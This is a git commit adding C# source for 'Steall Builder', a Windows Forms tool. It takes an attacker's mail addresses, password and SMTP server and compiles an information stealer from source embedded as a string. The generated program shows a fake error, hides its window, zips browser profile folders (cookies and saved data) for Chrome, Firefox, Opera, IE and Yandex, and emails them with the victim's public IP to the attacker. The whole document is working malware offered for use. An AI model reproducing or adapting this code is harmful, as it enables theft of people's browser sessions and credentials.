375171e43a9e3faf616b3dfba187f46dd82ef563
WhoAreY0u-F0rmatC <56751673+f0rmatY0urC@users.noreply.github.com>
2019-10-27 00:03:12 +0300

    Source Code.

---
+++ src/StealBuilder-By-FormatC/Form1.Designer.cs
@@ -0,0 +1,210 @@
+﻿namespace StealBuilder_By_FormatC
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.button1 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label6 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label7 = new System.Windows.Forms.Label();
+            this.textBox4 = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(52, 181);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(491, 67);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Build";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Yi Baiti", 13.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(48, 12);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(75, 24);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Mail to:";
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.SystemColors.ControlDarkDark;
+            this.textBox1.Location = new System.Drawing.Point(129, 12);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(441, 24);
+            this.textBox1.TabIndex = 2;
+            this.textBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Yi Baiti", 13.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.Location = new System.Drawing.Point(48, 52);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(96, 24);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Mail from:";
+            // 
+            // textBox2
+            // 
+            this.textBox2.BackColor = System.Drawing.SystemColors.ControlDarkDark;
+            this.textBox2.Location = new System.Drawing.Point(150, 52);
+            this.textBox2.Multiline = true;
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(420, 24);
+            this.textBox2.TabIndex = 4;
+            this.textBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Yi Baiti", 13.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.Location = new System.Drawing.Point(48, 91);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(228, 24);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "Password for \"Mail from\"";
+            // 
+            // textBox3
+            // 
+            this.textBox3.BackColor = System.Drawing.SystemColors.ControlDarkDark;
+            this.textBox3.Location = new System.Drawing.Point(282, 91);
+            this.textBox3.Multiline = true;
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(288, 24);
+            this.textBox3.TabIndex = 6;
+            this.textBox3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("MS Gothic", 4.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label4.Location = new System.Drawing.Point(69, 166);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(80, 9);
+            this.label4.TabIndex = 7;
+            this.label4.Text = "Author: FormatC";
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Font = new System.Drawing.Font("MS Gothic", 4.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label6.Location = new System.Drawing.Point(186, 166);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(165, 9);
+            this.label6.TabIndex = 8;
+            this.label6.Text = "Github: github.com/armadillo-cld";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("MS Gothic", 4.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label5.Location = new System.Drawing.Point(403, 166);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(135, 9);
+            this.label5.TabIndex = 9;
+            this.label5.Text = "VK: vk.com/sha1.encryption";
+            // 
+            // label7
+            // 
+            this.label7.AutoSize = true;
+            this.label7.Font = new System.Drawing.Font("Microsoft Yi Baiti", 13.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label7.Location = new System.Drawing.Point(48, 128);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(66, 24);
+            this.label7.TabIndex = 10;
+            this.label7.Text = "SMTP:";
+            // 
+            // textBox4
+            // 
+            this.textBox4.BackColor = System.Drawing.SystemColors.ControlDarkDark;
+            this.textBox4.Location = new System.Drawing.Point(120, 128);
+            this.textBox4.Multiline = true;
+            this.textBox4.Name = "textBox4";
+            this.textBox4.Size = new System.Drawing.Size(450, 24);
+            this.textBox4.TabIndex = 11;
+            this.textBox4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.DimGray;
+            this.ClientSize = new System.Drawing.Size(582, 253);
+            this.Controls.Add(this.textBox4);
+            this.Controls.Add(this.label7);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.button1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximumSize = new System.Drawing.Size(600, 300);
+            this.MinimumSize = new System.Drawing.Size(600, 300);
+            this.Name = "Form1";
+            this.Text = "Steall Builder";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label7;
+        private System.Windows.Forms.TextBox textBox4;
+    }
+}
+
---
+++ src/StealBuilder-By-FormatC/Form1.cs
@@ -0,0 +1,187 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Threading;
+using System.IO;
+
+namespace StealBuilder_By_FormatC
+{
+    public partial class Form1 : Form
+    {
+        // Code of stealer
+        private static string GetCode(string mailFrom, string mailFromPass, string mailTo, string smtp)
+        {
+            string code = "using System;\n" +
+                "using System.Net;\n" +
+                "using System.Net.Mail;\n" +
+                "using System.Runtime.InteropServices;\n" +
+                "using System.Windows.Forms;\n" +
+                "using System.IO;\n" +
+                "using System.Threading;\n" +
+                "using System.Net.Mime;\n" +
+                "using Ionic.Zip;\n" +
+                "\n" +
+                "namespace Stealler\n" +
+                "{\n" +
+                "\tstatic class Program\n" +
+                "\t{\n" +
+                "\t\t[DllImport(\"kernel32.dll\")]\n" +
+                "\t\tstatic extern IntPtr GetConsoleWindow();\n" +
+                "\t\t[DllImport(\"user32.dll\")]\n" +
+                "\t\tstatic extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n" +
+                "\t\tconst int SW_HIDE = 0;\n" +
+                "\t\t[STAThread]\n" +
+                "\t\tstatic void Main()\n" +
+                "\t\t{\n" +
+                "\t\t\tMessageBox.Show(\"Error: not found mscvr_x64.exe.\");\n" +
+                "\t\t\tShowWindow(GetConsoleWindow(), SW_HIDE);\n" +
+                "\t\t\tstring[] browsers = {@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Local\\Google\\\",\n" +
+                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Roaming\\Opera Software\\Opera Stable\\\",\n" +
+                "\t\t\t@\"C:\\Documents and Settings\\\" + Environment.UserName + @\"\\Application Data\\Mozilla\\Firefox\\\",\n" +
+                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Roaming\\Mozilla\\Firefox\\\",\n" +
+                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Local\\Microsoft\\Internet Explorer\\\",\n" +
+                "\t\t\t@\"C:\\Users\\\" + Environment.UserName + @\"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\\"};\n" +
+                "\n" +
+                "\t\t\tstring[] browsers_name = { \"Google Chrome\", \"Opera\", \"Firfox\", \"Firefox\", \"Internet Explorer\", \"Yandex\" };\n" +
+                "\t\t\tfor (int i = 0; i < browsers.Length; i++)\n" +
+                "\t\t\t{\n" +
+                "\t\t\t\ttry\n" +
+                "\t\t\t\t{\n" +
+                "\t\t\t\t\tIonic.Zip.ZipFile zip = new Ionic.Zip.ZipFile();\n" +
+                "\t\t\t\t\tzip.AddDirectory(browsers[i]);\n" +
+                "\t\t\t\t\tzip.Save(@\"C:\\Windows\\Temp\\Cookies\" + i + \".zip\");\n" +
+                "\t\t\t\t}\n" +
+                "\t\t\t\tcatch (Exception ex) { }\n" +
+                "\t\t\tfor (int k = 0; k < browsers.Length; k++)\n" +
+                "\t\t\t{\n" +
+                "\t\t\t\tPhishing(browsers[k], @\"C:\\Windows\\Temp\\Cookies\" + k + \".zip\", browsers_name[k]);\n" +
+                "\t\t\t}\n" +
+                "\t\t\tfor (int j = 0; j < browsers.Length; j++)\n" +
+                "\t\t\t{\n" +
+                "\t\t\t\ttry\n" +
+                "\t\t\t\t{\n" +
+                "\t\t\t\t\tFile.Delete(@\"C:\\Windows\\Temp\\Cookies\" + j + \".zip\");\n" +
+                "\t\t\t\t}\n" +
+                "\t\t\t\tcatch (Exception ex) { }\n" +
+                "\t\t\t}\n" +
+                "\t\t}\n" +
+                "\t}\n" +
+                "\t\tpublic static void Phishing(string dir, string dirZip, string brName)\n" +
+                "\t\t{\n" +
+                "\t\t\tThread.Sleep(3000);\n" +
+                "\t\t\tMailMessage mail = new MailMessage();\n" +
+                "\t\t\tmail.From = new MailAddress(\"" + mailFrom + "\");\n" +
+                "\t\t\tmail.To.Add(new MailAddress(\"" + mailTo + "\"));\n" +
+                "\t\t\tmail.Subject = \"STEALLER | \" + brName + \" browser | Logs on \" + Environment.UserName;\n" +
+                "\t\t\tstring pubIp = new System.Net.WebClient().DownloadString(\"https://api.ipify.org\");\n" +
+                "\t\t\tmail.Body = \"Cookies for \" + brName + \" browser.<br>Other: <br>Public IP: \" + pubIp + \"<br>PC Name: \" + Environment.UserName;\n" +
+                "\t\t\ttry\n" +
+                "\t\t\t{\n" +
+                "\t\t\t\tAttachment attach = new Attachment(dirZip, MediaTypeNames.Application.Octet);\n" +
+                "\t\t\t\tmail.Attachments.Add(attach);\n" +
+                "\t\t\t}\n" +
+                "\t\t\tcatch (Exception ex)\n" +
+                "\t\t\t{\n" +
+                "\t\t\t\tgoto skip;\n" +
+                "\t\t\t}\n" +
+                "\t\t\tSmtpClient client = new SmtpClient();\n" +
+                "\t\t\tclient.Host = \"" + smtp + "\";\n" +
+                "\t\t\tclient.Port = 587;\n" +
+                "\t\t\tclient.EnableSsl = true;\n" +
+                "\t\t\tclient.Credentials = new NetworkCredential(\"" + mailFrom + "\", \"" + mailFromPass + "\");\n" +
+                "\t\t\ttry\n" +
+                "\t\t\t{\n" +
+                "\t\t\t\tclient.Send(mail);\n" +
+                "\t\t\t}\n" +
+                "\t\t\tcatch (Exception ex)\n" +
+                "\t\t\t{\n" +
+                "\t\t\t}\n" +
+                "\t\tskip:\n" +
+                "\t\t\tConsole.WriteLine();\n" +
+                "\t\t\t}\n" +
+                "\t\t}\n" +
+                "\t}\n";
+            return code;
+        }
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            // Check on exists directory "Steallers"
+            if (Directory.Exists("Steallers") == false)
+            {
+                Directory.CreateDirectory("Steallers");
+            }
+            // csc /out:C:\users\asus\desktop\123.exe /t:exe
+            // c:\users\asus\desktop\steallerBuilder\Program.cs /r:C:\Users\asus\desktop\steallerBuilder\compiler\ionic.zip.dll
+            Random rand = new Random();
+            int randInt = rand.Next();
+
+            // Check for text in textbox
+            if (textBox1.Text != "" && textBox2.Text != "" && textBox3.Text != "")
+            {
+                // Check for a character in mail
+                if (textBox1.Text.Contains("@") && textBox2.Text.Contains("@"))
+                {
+                    try
+                    {
+                        // Create and write code in file
+                        StreamWriter stealler = new StreamWriter("Steallers\\" + randInt.ToString() + ".cs");
+                        // Write code
+                        stealler.WriteLine(GetCode(textBox2.Text, textBox3.Text, textBox1.Text, textBox4.Text));
+                        // Close
+                        stealler.Close();
+
+                        // Start compiler C#
+                        Process process = new System.Diagnostics.Process();
+                        ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+                        // No show Window
+                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                        startInfo.CreateNoWindow = true;
+                        // There should be a compiler with dll in the folder
+                        startInfo.FileName = @"Compiler\csc.exe";
+                        // Arguments for compiler.
+                        startInfo.Arguments = @" /out:Steallers\\Stealler" + randInt.ToString() + ".exe" + " /t:exe Steallers\\" + randInt.ToString() + ".cs /r:Compiler\\Ionic.Zip.dll";
+                        process.StartInfo = startInfo;
+                        // Start
+                        process.Start();
+                        // To wait for compiles
+                        Thread.Sleep(1000);
+
+                        // Check for the necessary dll. Without it, unfortunately, the stealler will not start
+                        if (File.Exists("Steallers\\Ionic.Zip.dll") == false)
+                        {
+                            // If there is no file - copy from the compiler folder
+                            File.Copy("Compiler\\Ionic.Zip.dll", "Steallers\\Ionic.Zip.dll");
+                        }
+                        // Delete the file with the code because it already exists .exe
+                        File.Delete("Steallers\\" + randInt.ToString() + ".cs");
+
+                        // Successfull
+                        MessageBox.Show("SUCCESSFULL! Your stealler created in Stealler directory");
+                    }
+                    catch(Exception ex)
+                    {
+                        // Ooops!
+                        MessageBox.Show("ERROR: " + ex.ToString());
+                    }
+                }
+                // If there is no @ in two TextBoxes, then print an error
+                else
+                {
+                    // Error
+                    MessageBox.Show("Please, enter the correct mail");
+                }
+            }
+            // If textBoxes is empty
+            else
+            {
+                // Please, fill textBoxes
+                MessageBox.Show("Please, fill in the fields");
+            }
+        }
+    }
+}
